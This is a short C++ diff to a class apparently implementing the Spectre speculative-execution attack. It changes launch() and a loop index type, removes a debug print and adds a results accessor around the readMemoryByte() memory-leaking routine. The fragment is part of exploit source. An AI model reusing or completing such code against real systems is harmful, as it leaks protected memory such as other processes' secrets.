@@ -71,16 +71,15 @@ void crySpectre::target(void *_ba, uint64_t _ar)
 /**
  * Launches Spectre and reads
  */
-bool crySpectre::launch()
+void crySpectre::launch()
 {
-    printf("%p\n",baseAddr);
     // Calc the real base address
     size_t addr = (size_t)((char*)baseAddr-interim);    
     int32_t score[2] = {0};
     uint8_t value[2] = {0};
 
     //    for(int32_t i = addrRange - 1; i >= 0; --i)
-    for( int32_t i = 0; i < addrRange; ++i)
+    for( uint32_t i = 0; i < addrRange; ++i)
     {
         // Read
         readMemoryByte(addr++, value, score);
@@ -183,4 +182,9 @@ void crySpectre::readMemoryByte(size_t addr, uint8_t val[2], int32_t score[2])
     score[0] = res[j];
     val[1] = (uint8_t)k;
     score[1] = res[k];
+}
+
+char *crySpectre::getResults()
+{
+    return results;
 }
